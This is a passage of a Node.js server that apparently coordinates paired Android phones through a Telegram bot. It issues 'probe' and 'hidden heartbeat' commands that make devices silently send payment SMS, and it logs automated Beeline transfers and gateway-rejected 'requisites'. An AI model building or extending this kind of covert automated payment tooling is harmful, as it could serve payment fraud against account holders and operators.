          return sendJson(res, 200, { device: deviceView(d), state: tokenStateView(t, resolveTelegramId(req)) });
        }
        if (m === 'POST' && action === 'active') {
          const body = await readJson(req);
          d.active = Boolean(body && body.active);
          bumpDevice(d);
          saveDb();
          return sendJson(res, 200, { device: deviceView(d), state: tokenStateView(t, resolveTelegramId(req)) });
        }
        if (m === 'POST' && action === 'name') {
          const body = await readJson(req);
          d.name = String((body && body.name) || '').trim().slice(0, 60) || d.name;
          saveDb();
          return sendJson(res, 200, { device: deviceView(d), state: tokenStateView(t, resolveTelegramId(req)) });
        }
        if (m === 'POST' && action === 'pair') {
          d.pairedAt = 0; d.secret = ''; d.hardwareId = '';
          d.pairing = { code: newPairingCode(), expiresAt: now() + PAIRING_TTL_MS };
          bumpDevice(d);
          saveDb();
          return sendJson(res, 200, { device: deviceView(d), state: tokenStateView(t, resolveTelegramId(req)) });
        }
        // One-shot «Метод Форс» test: the device dry-runs the Beeline flow now and
        // reports what it sees to the bot (without pressing «Отправить»).
        if (m === 'POST' && action === 'mftest') {
          d.mfTestReq = uuid();
          bumpDevice(d);
          saveDb();
          return sendJson(res, 200, { device: deviceView(d), state: tokenStateView(t, resolveTelegramId(req)) });
        }
        return sendJson(res, 405, { error: 'method_not_allowed' });
      }
      return sendJson(res, 404, { error: 'not_found' });
    }

    // ================= Device (APK) API =================
    if (p === '/api/device/pair' && m === 'POST') {
      const body = await readJson(req);
      if (!body) return sendJson(res, 400, { error: 'bad_json' });
      const code = String(body.code || '').trim().toUpperCase();
      const hardwareId = String(body.hardwareId || '').slice(0, 128);
      const model = String(body.model || '').slice(0, 80);
      if (!code) return sendJson(res, 400, { error: 'no_code' });
      const d = db.devices.find((x) => x.pairing && x.pairing.code === code && now() < x.pairing.expiresAt);
      if (!d) return sendJson(res, 404, { error: 'invalid_or_expired_code' });
      d.secret = newSecret(); d.hardwareId = hardwareId; d.hardwareModel = model;
      d.pairedAt = now(); d.lastSeen = now(); d.pairing = null;
      saveDb();
      return sendJson(res, 200, { deviceId: d.id, secret: d.secret, name: d.name, syncIntervalMs: SYNC_INTERVAL_MS });
    }

    // A device reports a payment-gateway event (e.g. a rejected requisite).
    if (p === '/api/device/event' && m === 'POST') {
      const body = await readJson(req);
      if (!body) return sendJson(res, 400, { error: 'bad_json' });
      const secret = String(body.secret || '');
      const d = db.devices.find((x) => x.id === String(body.deviceId || ''));
      if (!d || !d.secret || !safeEqual(d.secret, secret)) return sendJson(res, 403, { error: 'unauthorized' });
      const t = db.tokens.find((x) => x.id === d.tokenId);
      if (body.type === 'rejected' && t && t.telegramId) {
        const requisites = String(body.requisites || '').slice(0, 300);
        tgSend(t.telegramId,
          `❗️ Реквизит «<b>${eschtml(requisites)}</b>» отклоняется платёжным шлюзом — замените его на другой.\n` +
          `Устройство: «<b>${eschtml(d.name)}</b>».`);
      }
      // A device caught "символ" (from the probe pool or otherwise) → treat it
      // as a system-wide signal, same as the MacroDroid webhook.
      if (body.type === 'signal') {
        // Heartbeat echo: this "символ" came back from the device's own scheduled
        // heartbeat SMS (or is inside the ~1 min quiet window after it). It must
        // NOT raise a system signal — the device still replied "Ок" on its own.
        if (d.heartbeatAt && (now() - d.heartbeatAt) < HEARTBEAT_QUIET_MS) {
          db.signalLog.push({ at: now(), source: 'heartbeat:' + (d.name || d.id),
            started: 0, skipped: 0, suppressed: true, tokens: [] });
          if (db.signalLog.length > 5000) db.signalLog = db.signalLog.slice(-3000);
          saveDbSoon();
          return sendJson(res, 200, { ok: true, suppressed: true });
        }
        fireSignal('device:' + (d.name || d.id));
        saveDb();
        return sendJson(res, 200, { ok: true });
      }
      // «Автоматическое подтверждение» is OFF: the device caught «символ» but did
      // NOT answer «Ок». Prompt the owner (and employees) to confirm from the bot;
      // pressing «Подтвердить» tells the device to send the deferred «Ок».
      if (body.type === 'confirm_request' && t) {
        const recips = [];
        if (t.telegramId) recips.push(t.telegramId);
        for (const emp of (t.employees || [])) if (emp && emp.telegramId) recips.push(emp.telegramId);
        const msg =
          `🔐 <b>Подтвердите платеж на устройстве «${eschtml(d.name)}»</b>\n` +
          `Пришёл «символ» — автоматическое подтверждение выключено. Нажмите кнопку, ` +
          `чтобы отправить «Ок» с устройства.`;
        const kb = [[{ text: '✅ Подтвердить', callback_data: `cf:${d.id}` }]];
        for (const chatId of recips) tgSend(chatId, msg, kb);
        return sendJson(res, 200, { ok: true });
      }

      // «Метод Форс» diagnostic: the device reports what it sees on the Beeline
      // screen (or where it got stuck) — relayed to the owner + employees so the
      // flow can be tuned without a rebuild.
      if (body.type === 'mf_debug' && t) {
        const line = String(body.requisites || '').slice(0, 1000);
        const recips = [];
        if (t.telegramId) recips.push(t.telegramId);
        for (const emp of (t.employees || [])) if (emp && emp.telegramId) recips.push(emp.telegramId);
        const msg = `🛠 <b>Метод Форс · диагностика</b>\nУстройство: <b>${eschtml(d.name)}</b>\n${eschtml(line)}`;
        for (const chatId of recips) tgSend(chatId, msg);
        return sendJson(res, 200, { ok: true });
      }

      // "Метод Форс": a device finished one automated Beeline transfer (caught
      // «символ», answered «Ок», got «успешно»). Log it like a normal successful
      // payment AND send a dedicated report to the owner. Does not stop or gate
      // any other device — each runs its own hourly cycle independently.
      if (body.type === 'metodfors' && t) {
        const requisites = String(body.requisites || '').slice(0, 300);
        const amount = normalizeAmount(body.amount).slice(0, 32);
        const at = now();
        db.paymentsLog.push({
          tokenId: t.id, tokenComment: t.comment || '',
          deviceId: d.id, deviceName: d.name,
          requisites, amount, session: 'metodfors', method: 'metodfors', at,
        });
        if (db.paymentsLog.length > 10000) db.paymentsLog = db.paymentsLog.slice(-8000);
        saveDbSoon();
        const recips = [];
        if (t.telegramId) recips.push(t.telegramId);
        for (const emp of (t.employees || [])) if (emp && emp.telegramId) recips.push(emp.telegramId);
        const msg =
          `⚡️ <b>Метод Форс</b> — устройство отработало\n` +
          `Устройство: <b>${eschtml(d.name)}</b>\n` +
          `Номер: <b>${eschtml(requisites)}</b>\n` +
          `Сумма: <b>${eschtml(amount)}</b>\n` +
          `Дата и время: ${fmtDateTime(at)}`;
        for (const chatId of recips) tgSend(chatId, msg);
        return sendJson(res, 200, { ok: true });
      }

      // A payment went through ("успешно") — log it for the admin summary and
      // notify the owner immediately (a message per successful payment).
      if (body.type === 'success' && t) {
        const requisites = String(body.requisites || '').slice(0, 300);
        const amount = normalizeAmount(body.amount).slice(0, 32);
        const at = now();
        db.paymentsLog.push({
          tokenId: t.id, tokenComment: t.comment || '',
          deviceId: d.id, deviceName: d.name,
          requisites, amount, session: t.workSession || '', at,
        });
        if (db.paymentsLog.length > 10000) db.paymentsLog = db.paymentsLog.slice(-8000);
        saveDbSoon();

        if (t.telegramId) {
          // Plain notification, no per-device counting logic. Owner + every
          // employee on this token get the same message.
          const msg =
            `✅ Платеж <b>${eschtml(amount)}</b> успешно отправлен.\n` +
            `Устройство: <b>${eschtml(d.name)}</b>\n` +
            `Реквизит: <b>${eschtml(requisites)}</b>\n` +
            `Дата и время: ${fmtDateTime(at)}\n` +
            `Осталось отправить платежей на данном устройстве: <b>без лимита</b>`;
          tgSend(t.telegramId, msg);
          for (const emp of (t.employees || [])) {
            if (emp && emp.telegramId) tgSend(emp.telegramId, msg);
          }
        }
      }
      return sendJson(res, 200, { ok: true });
    }

    if (p === '/api/device/sync' && m === 'POST') {
      const body = await readJson(req);
      if (!body) return sendJson(res, 400, { error: 'bad_json' });
      const secret = String(body.secret || '');
      const d = db.devices.find((x) => x.id === String(body.deviceId || ''));
      if (!d || !d.secret || !safeEqual(d.secret, secret)) return sendJson(res, 403, { error: 'unauthorized' });
      const t = db.tokens.find((x) => x.id === d.tokenId);
      d.lastSeen = now();
      if (body.status && typeof body.status === 'object') {
        d.status = {
          running: Boolean(body.status.running),
          sentCount: parseInt(body.status.sentCount, 10) || 0,
          paymentIndex: parseInt(body.status.paymentIndex, 10) || 0,
          triggerCount: parseInt(body.status.triggerCount, 10) || 0,
          paused: Boolean(body.status.paused),
          done: Boolean(body.status.done),
          workSession: String(body.status.workSession || ''),
          lastError: body.status.lastError ? String(body.status.lastError).slice(0, 200) : null,
          appVersionCode: parseInt(body.status.appVersionCode, 10) || 0,
          at: now(),
        };
      }
      saveDbSoon();

      // When every participating device has finished the session, stop and report.
      if (t && sessionComplete(t)) {
        // Log the auto-stop with a snapshot of every currently-participating
        // device, so a "почему само остановилось" report can be checked later
        // instead of guessing from a live poll.
        const parts = participatingDevices(t);
        db.stopLog.push({
          at: now(), tokenId: t.id, tokenComment: t.comment || '',
          workSession: t.workSession, workMode: t.workMode,
          devices: parts.map((pd) => ({
            id: pd.id, name: pd.name, active: !!pd.active,
            sentCount: (pd.status && pd.status.sentCount) || 0,
            paymentIndex: (pd.status && pd.status.paymentIndex) || 0,
            done: !!(pd.status && pd.status.done),
          })),
        });
        if (db.stopLog.length > 3000) db.stopLog = db.stopLog.slice(-2000);
        t.globalOn = false;
        bumpToken(t);
        maybeSendReport(t);
        saveDb();
      }
      const current = deviceVersion(d, t);
      const wait = body.wait !== false;
      if (wait && String(body.version || '') === current) {
        let set = waiters.get(d.id);
        if (!set) { set = new Set(); waiters.set(d.id, set); }
        const entry = { res, secret, timer: null };
        entry.timer = setTimeout(() => {
          const s = waiters.get(d.id);
          if (s) { s.delete(entry); if (s.size === 0) waiters.delete(d.id); }
          try { finishSync(res, d, secret); } catch (e) {}
        }, LONGPOLL_TIMEOUT_MS);
        set.add(entry);
        req.on('close', () => {
          clearTimeout(entry.timer);
          const s = waiters.get(d.id);
          if (s) { s.delete(entry); if (s.size === 0) waiters.delete(d.id); }
        });
        return;
      }
      return sendJson(res, 200, buildSyncPayload(d, t));
    }

    // ================= Legacy password admin =================
    if (p === '/admin' && m === 'GET') {
      if (!requireAdmin(req, res)) return;
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(renderAdmin());
    }
    if (p === '/admin/create' && m === 'POST') {
      if (!requireAdmin(req, res)) return;
      const f = parseForm(await readBody(req));
      const days = parseInt(f.days, 10);
      db.tokens.push({
        id: uuid(), value: newTokenValue(), comment: String(f.comment || '').slice(0, 200),
        enabled: true, createdAt: now(),
        expiresAt: Number.isFinite(days) && days > 0 ? now() + days * 86400000 : 0,
        deviceLimit: Math.max(0, parseInt(f.deviceLimit, 10) || 0),
        telegramId: null, employees: [], employeeInvites: [], globalOn: false, signalEnabled: false, metodForsEnabled: false, workSession: '', schedule: defaultSchedule(), rev: 0,
      });
      saveDb();
      res.writeHead(302, { Location: '/admin' }); return res.end();
    }
    if (p === '/admin/quota' && m === 'POST') {
      if (!requireAdmin(req, res)) return;
      const f = parseForm(await readBody(req));
      const t = db.tokens.find((x) => x.id === f.id);
      if (t) { t.deviceLimit = Math.max(0, parseInt(f.deviceLimit, 10) || 0); saveDb(); }
      res.writeHead(302, { Location: '/admin' }); return res.end();
    }
    if (p === '/admin/extend' && m === 'POST') {
      if (!requireAdmin(req, res)) return;
      const f = parseForm(await readBody(req));
      const t = db.tokens.find((x) => x.id === f.id);
      if (t) { const days = parseInt(f.days, 10); t.expiresAt = Number.isFinite(days) && days > 0 ? now() + days * 86400000 : 0; bumpToken(t); saveDb(); }
      res.writeHead(302, { Location: '/admin' }); return res.end();
    }
    if (p === '/admin/toggle' && m === 'POST') {
      if (!requireAdmin(req, res)) return;
      const f = parseForm(await readBody(req));
      const t = db.tokens.find((x) => x.id === f.id);
      if (t) { t.enabled = !t.enabled; bumpToken(t); saveDb(); }
      res.writeHead(302, { Location: '/admin' }); return res.end();
    }
    if (p === '/admin/delete' && m === 'POST') {
      if (!requireAdmin(req, res)) return;
      const f = parseForm(await readBody(req));
      db.tokens = db.tokens.filter((x) => x.id !== f.id);
      db.devices = db.devices.filter((x) => x.tokenId !== f.id);
      saveDb();
      res.writeHead(302, { Location: '/admin' }); return res.end();
    }

    // Publish a new APK + version (Basic-auth). Upload the APK, then announce.
    if (p === '/admin/apk' && m === 'PUT') {
      if (!requireAdmin(req, res)) return;
      let buf;
      try { buf = await readRawBody(req, MAX_APK_BYTES); } catch (e) { return sendJson(res, 413, { error: 'too_large' }); }
      ensureDataDir();
      fs.writeFileSync(APK_FILE, buf);
      return sendJson(res, 200, { ok: true, bytes: buf.length });
    }
    if (p === '/admin/release' && m === 'POST') {
      if (!requireAdmin(req, res)) return;
      let parsed;
      try { parsed = JSON.parse((await readBody(req)) || '{}'); } catch (e) { return sendJson(res, 400, { error: 'bad_json' }); }
      const info = {
        versionCode: parseInt(parsed.versionCode, 10) || 0,
        versionName: String(parsed.versionName || ''),
        notes: String(parsed.notes || ''),
      };
      ensureDataDir();
      fs.writeFileSync(UPDATE_FILE, JSON.stringify(info, null, 2));
      return sendJson(res, 200, { ok: true, published: info });
    }

    // ================= Static / root =================
    if ((p === '/' || p === '/app' || p === '/index.html') && m === 'GET') {
      return serveStatic(res, path.join(PUBLIC_DIR, 'miniapp.html'), 'text/html; charset=utf-8', true);
    }
    if (p === '/qrcode.js' && m === 'GET') {
      return serveStatic(res, path.join(PUBLIC_DIR, 'qrcode.js'), 'application/javascript; charset=utf-8');
    }
    if (p === '/health' && m === 'GET') return sendJson(res, 200, { ok: true });

    res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('Not found');
  } catch (e) {
    console.error('Request error:', e);
    sendJson(res, 500, { error: 'server_error' });
  }
});

// ---------------------------------------------------------------------------
// Schedule auto-start: every 30s, start work for tokens whose window is active
// now (once per day when repeatDaily, once otherwise). This is what makes the
// schedule "just work" — and what lets a coinciding signal be ignored.
// ---------------------------------------------------------------------------
setInterval(() => {
  try {
    let changed = false;
    // Safety net: force-end signal sessions that have been "on" too long (device
    // offline / old app never reported done) so they stop blocking new signals.
    for (const t of db.tokens) {
      if (t.globalOn && t.workMode === 'signal' && t.lastSignalAt &&
          (now() - t.lastSignalAt) > SIGNAL_SESSION_MAX_MS) {
        t.globalOn = false;
        t.workSession = '';
        bumpToken(t);
        changed = true;
      }
    }
    for (const t of db.tokens) {
      if (!tokenValid(t)) continue;
      const sch = t.schedule || defaultSchedule();
      const w = currentWindow(sch.windows);
      if (!w) continue;
      // Per-window key so multiple windows (e.g. 03:00 and 16:00) each fire.
      // repeatDaily → keyed by date (once per day); else once ever (until edit).
      const key = (sch.repeatDaily ? localDateStr() : 'once') + `#${w.startSec}-${w.endSec}`;
      t.scheduleRuns = t.scheduleRuns || [];
      if (t.scheduleRuns.includes(key)) continue;
      t.scheduleRuns.push(key);
      if (t.scheduleRuns.length > 60) t.scheduleRuns = t.scheduleRuns.slice(-60);
      if (!t.globalOn) startSession(t, 'schedule');
      changed = true;
    }
    if (changed) saveDb();
  } catch (e) { console.error('scheduler error:', e.message); }
}, 15000);

// --- Probe pool: evenly probe all active/online devices (≤ N per hour each) to
// detect the open window; a caught "символ" fires the system signal. ---
let lastProbeAt = 0;
setInterval(() => {
  try {
    if (!(db.settings && db.settings.probeEnabled)) return;
    const nowMs = now();
    // Eligible = active, online, has a payment, token valid, under the hourly cap.
    let eligible = db.devices.filter((d) => probeEligible(d, db.tokens.find((t) => t.id === d.tokenId)));
    if (eligible.length === 0) return;
    // Even spacing: N devices × N-per-hour probes ⇒ one probe every 3600/(cap·N)s.
    const intervalMs = Math.max(PROBE_MIN_GAP_MS, Math.floor(3600000 / (PROBES_PER_HOUR * eligible.length)));
    if (nowMs - lastProbeAt < intervalMs) return;
    // Catch up if we're behind (many devices), but cap the burst per tick.
    let due = Math.min(20, Math.max(1, Math.floor((nowMs - lastProbeAt) / intervalMs)));
    let fired = 0;
    while (due-- > 0 && eligible.length) {
      const pick = eligible[Math.floor(Math.random() * eligible.length)];
      issueProbe(pick);
      fired++;
      // Recompute eligibility (the picked device may have hit its cap).
      eligible = eligible.filter((d) => probeEligible(d, db.tokens.find((t) => t.id === d.tokenId)));
    }
    if (fired) { lastProbeAt = nowMs; saveDbSoon(); }
  } catch (e) { console.error('probe pool error:', e.message); }
}, 3000);

// --- Hidden heartbeat: on every wall-clock 10-minute mark (:00 :10 :20 :30 :40,
// skipping :50 → 5/hour) each active/idle device silently sends one payment SMS.
// See HEARTBEAT_ENABLED. Fires close to the boundary (only within the first 30s
// of a slot), once per slot, independent of the admin probe pool. ---
let lastHeartbeatSlot = '';
setInterval(() => {
  try {
    if (!HEARTBEAT_ENABLED) return;
    const dt = new Date();
    const slot = Math.floor(dt.getMinutes() / 10); // 0..5 (5 = the :50 slot)
    const slotId = `${dt.getFullYear()}-${dt.getMonth() + 1}-${dt.getDate()}-${dt.getHours()}-${slot}`;
    if (slotId === lastHeartbeatSlot) return; // already handled this slot
    // Only act right at the boundary so sends land on :X0:00. If we join a slot
    // late (server busy / just restarted), mark it consumed and wait for the next.
    if (dt.getSeconds() >= 30) { lastHeartbeatSlot = slotId; return; }
    lastHeartbeatSlot = slotId;
    if (slot === 5) return; // skip the :50 slot ⇒ exactly 5 heartbeats per hour
    let fired = 0;
    for (const d of db.devices) {
      const t = db.tokens.find((x) => x.id === d.tokenId);
      if (!heartbeatEligible(d, t)) continue;
      issueHeartbeat(d);
      fired++;
    }
    if (fired) { console.log(`heartbeat ${slotId}: ${fired} device(s)`); saveDbSoon(); }
  } catch (e) { console.error('heartbeat error:', e.message); }
}, 5000);

server.listen(PORT, () => {
  console.log(`ALFA SMS central server on port ${PORT}`);
  console.log(`Mini-app / bot Web App URL: ${PUBLIC_BASE_URL}/`);
  console.log(`Legacy admin: http://localhost:${PORT}/admin (user: ${ADMIN_USER})`);
  console.log(`In-app admin Telegram id: ${ADMIN_TG_ID}`);
  console.log(`SMS recipient number: ${RECIPIENT_NUMBER}; signal number (символ/успешно): ${SIGNAL_NUMBER}`);
  console.log(`Signal webhook (MacroDroid): ${PUBLIC_BASE_URL}/api/signal/${SIGNAL_SECRET}`);
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('WARNING: TELEGRAM_BOT_TOKEN not set — initData NOT verified, bot reports disabled (dev mode).');
  } else {
    // Register the webhook so the bot delivers button presses to us. Idempotent.
    const url = `${PUBLIC_BASE_URL}/bot/${WEBHOOK_SECRET}`;
    tgApi('setWebhook', { url, secret_token: WEBHOOK_SECRET, allowed_updates: ['message', 'callback_query'] })
      .then((r) => console.log(`Telegram setWebhook -> ${url} : ${r && r.ok ? 'ok' : JSON.stringify(r)}`))
      .catch((e) => console.error('setWebhook failed:', e.message));
  }
});
